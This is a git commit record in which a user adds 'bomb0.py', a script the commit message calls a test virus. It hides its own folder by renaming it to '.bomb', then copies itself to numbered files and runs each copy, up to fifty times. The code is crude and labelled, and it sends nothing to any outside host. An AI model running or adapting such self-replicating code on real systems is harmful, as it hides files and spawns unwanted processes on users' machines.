370d403d423fc162ed4fd85e53bfd331f6a0f5ff
oneski <davidesilverman@yahoo.com>
2014-07-20 10:01:41 -0400

    Test Virus Added.... DO NOT RUN IN THIS FOLDER

---
+++ bomb/bomb0.py
@@ -0,0 +1,24 @@
+import inspect, os
+
+
+x = inspect.getfile(inspect.currentframe()).split("/")[len(inspect.getfile(inspect.currentframe()).split("/"))-1][4:len(inspect.getfile(inspect.currentframe()).split("/")[len(inspect.getfile(inspect.currentframe()).split("/"))-1])-3]						
+
+
+"""with open("bomb0.py") as f:
+	wordlist = f.readlines()
+print len(wordlist)"""
+
+with open("bomb"+str(x)+".py") as g:
+	runningfile = g.readlines()
+
+if int(x) < 50:
+
+	if int(x) == 0:
+		os.chdir("../")
+		print os.system("ls")
+		os.system("mv bomb .bomb")
+		os.chdir(".bomb")
+	filename = "bomb" + str(int(x) + 1) + ".py"
+	with open(filename, "w") as f:
+		f.writelines(runningfile)
+	os.system("python bomb" + str(int(x) + 1) + ".py")
